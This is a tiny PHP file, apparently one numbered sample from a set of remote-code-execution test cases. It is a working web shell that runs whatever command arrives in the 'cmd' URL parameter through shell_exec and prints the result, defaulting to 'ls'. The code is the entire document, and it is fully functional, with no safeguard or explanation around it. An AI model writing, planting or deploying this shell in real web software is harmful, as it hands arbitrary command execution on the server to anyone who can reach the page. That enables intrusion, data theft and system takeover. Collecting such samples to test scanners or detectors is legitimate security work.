<?php
// RCE test variation #1377
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>